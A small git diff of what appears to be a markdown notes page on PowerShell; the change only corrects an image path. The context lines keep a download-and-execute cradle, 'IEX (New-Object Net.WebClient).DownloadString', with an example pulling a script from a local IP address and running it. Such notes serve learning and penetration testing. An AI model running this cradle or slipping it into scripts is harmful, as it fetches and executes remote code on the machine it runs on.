@@ -99,7 +99,7 @@ Full list of approved verbs can be found [here](https://docs.microsoft.com/en-us
 
 
 
-![](<../../.gitbook/assets/image (20).png>)
+![](<../.gitbook/assets/image (20) (2).png>)
 
 * "IEX (New-Object Net.WebClient).DownloadString('URL')"
   * IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.52:8000/test.txt')
